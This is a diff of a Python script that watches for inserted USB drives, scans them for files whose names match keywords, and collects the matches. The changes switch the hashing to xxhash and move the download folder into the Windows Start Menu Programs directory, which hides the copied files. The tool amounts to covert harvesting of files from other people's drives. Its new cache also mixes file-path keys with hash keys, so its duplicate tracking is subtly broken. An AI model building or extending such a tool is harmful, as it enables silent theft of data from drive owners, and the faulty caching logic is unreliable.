@@ -4,12 +4,11 @@ import shutil
 import time
 import logging
 import tempfile
-import hashlib
-import zipfile
+import xxhash
 import concurrent.futures
-
+import zipfile
 # 检查并创建下载文件夹
-download_folder = os.path.join(os.getcwd(), 'download')
+download_folder = os.path.join(os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs'), 'download')
 if not os.path.exists(download_folder):
     os.makedirs(download_folder)
 
@@ -32,7 +31,7 @@ logging.getLogger().addHandler(console_handler)
 keywords = ['数学', 'keyword2', 'keyword3']  # 填写你需要的关键词
 
 # 哈希表，用于记录文件的哈希值
-hash_table = set()
+hash_cache = {}
 
 # 检测是否是U盘
 def is_usb_drive(device):
@@ -50,20 +49,25 @@ def get_usb_drive_feature(usb_drive):
             for file_name in files:
                 relative_path = os.path.relpath(os.path.join(root, file_name), usb_drive)
                 feature_string += relative_path
-        return hashlib.sha256(feature_string.encode('utf-8')).hexdigest()
+        return xxhash.xxh64(feature_string.encode('utf-8')).hexdigest()
     except Exception as e:
         logging.error(f"U盘特征生成失误，因：{e}")
         return None
 
-# 获取文件的哈希值
+# 获取文件的哈希值（使用xxhash）
 def get_file_hash(file_path):
+    if file_path in hash_cache:
+        return hash_cache[file_path]
+
     try:
-        sha256_hash = hashlib.sha256()
+        hasher = xxhash.xxh64()  # 使用 64 位的 xxhash（速度更快）
         with open(file_path, "rb") as f:
             # 逐块读取文件并更新哈希值
             for byte_block in iter(lambda: f.read(4096), b""):
-                sha256_hash.update(byte_block)
-        return sha256_hash.hexdigest()
+                hasher.update(byte_block)
+        file_hash = hasher.hexdigest()
+        hash_cache[file_path] = file_hash  # 缓存结果
+        return file_hash
     except Exception as e:
         logging.error(f"获取文件 {file_path} 哈希值时失败，因：{e}")
         return None
@@ -77,9 +81,9 @@ def scan_usb_files(drive_path):
                 if any(keyword in file for keyword in keywords):
                     file_path = os.path.join(root, file)
                     file_hash = get_file_hash(file_path)
-                    if file_hash and file_hash not in hash_table:  # 如果文件哈希不在哈希表中
+                    if file_hash and file_hash not in hash_cache:  # 如果文件哈希不在缓存中
                         matched_files.append(file_path)
-                        hash_table.add(file_hash)  # 记录文件的哈希值
+                        hash_cache[file_hash] = file_path  # 记录文件的哈希值
         return matched_files
     except Exception as e:
         logging.error(f"扫描失误，因：{e}")
@@ -145,8 +149,8 @@ def handle_usb_drive(usb_drive):
 
 # 主程序
 def main():
-    global hash_table
-    with concurrent.futures.ThreadPoolExecutor() as executor:
+    global hash_cache
+    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:  # 限制并发线程数
         while True:
             # 检测所有设备
             usb_drives = [disk.device for disk in psutil.disk_partitions() if 'removable' in disk.opts]
@@ -163,7 +167,7 @@ def main():
 
             # 如果没有U盘，清空哈希表
             if not usb_drives:
-                hash_table.clear()
+                hash_cache.clear()
                 logging.info("没有检测到U盘，已清空哈希表。")
 
             time.sleep(7)  # 每7秒扫描一次
